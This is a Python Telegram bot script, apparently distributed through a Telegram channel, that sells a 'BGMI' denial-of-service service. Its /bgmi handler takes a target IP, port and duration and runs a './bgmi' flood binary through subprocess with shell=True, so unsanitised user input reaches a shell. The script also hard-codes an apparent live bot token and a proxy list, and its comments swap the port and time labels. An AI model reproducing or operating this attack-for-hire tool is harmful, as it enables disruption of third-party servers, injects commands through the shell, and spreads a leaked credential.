...
# Join :- @HUNTEROGMOD #bgmiddoserpython
...
# Join :- @HUNTEROGMOD #from keep_alive import keep_alive
# Join :- @HUNTEROGMOD #keep_alive()
# Join :- @HUNTEROGMOD # insert your Telegram bot token here
bot = telebot.TeleBot('7341527530:AAGmdZD4y1aoWhYEWFeY1pTKSc8_Y62mdOA')

# Join :- @HUNTEROGMOD # Admin user IDs
admin_id = ["5509692667"]

# Join :- @HUNTEROGMOD # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- @HUNTEROGMOD # File to store command logs
LOG_FILE = "log.txt"


# Join :- @HUNTEROGMOD # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # Join :- @HUNTEROGMOD # Add more proxy addresses as needed
]
...
# Join :- @HUNTEROGMOD # Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Join :- @HUNTEROGMOD # Check if line is not empty
...
# Join :- @HUNTEROGMOD # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # Join :- @HUNTEROGMOD # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Join :- @HUNTEROGMOD # Function to clear logs
def clear_logs():
    try:
...
# Join :- @HUNTEROGMOD # Function to record command logs
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "ONLY OWNER CAN USE Buy From :- @mr_manny01 ."
...
# Join :- @HUNTEROGMOD # Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🌟 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🌟SEND FEEDBACK @mr_manny01👍 \n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

# Join :- @HUNTEROGMOD # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Join :- @HUNTEROGMOD # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Join :- @HUNTEROGMOD # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Join :- @HUNTEROGMOD # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
                ...
                bot.reply_to(message, response)
                return
            # Join :- @HUNTEROGMOD # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- @HUNTEROGMOD # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- @HUNTEROGMOD # Convert time to integer
            time = int(command[3])  # Join :- @HUNTEROGMOD # Convert port to integer
            if time > 300:
                response = "Error: Time interval must be less than 180."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :- @HUNTEROGMOD # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Join :- @HUNTEROGMOD # Updated command syntax
    else:
        response = " You Are Not Authorized To Use This Command Buy From :- @mr_manny01 ."

    bot.reply_to(message, response)



# Join :- @HUNTEROGMOD # Add /mylogs command to display logs recorded for bgmi and website commands
...
Buy From :- @mr_manny01
Official Channel :- t.me/HUNTEROGMOD
'''
...
# Join :- @HUNTEROGMOD # Import the 'time' module for sleep functionality
import time
